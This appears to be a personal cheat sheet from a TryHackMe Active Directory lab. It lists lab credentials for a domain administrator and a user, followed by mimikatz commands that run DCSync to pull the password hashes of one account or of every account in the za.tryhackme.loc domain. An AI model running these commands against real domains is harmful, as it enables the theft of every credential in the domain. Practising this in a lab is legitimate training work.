ZA/Administrator : tryhackmewouldnotguess1@
louis.cole : Password!

DC Sync of an account
```
mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /user:<Your low-privilege AD Username>
```

```
mimikatz # log <username>_dcdump.txt 
```

```
mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /all
```


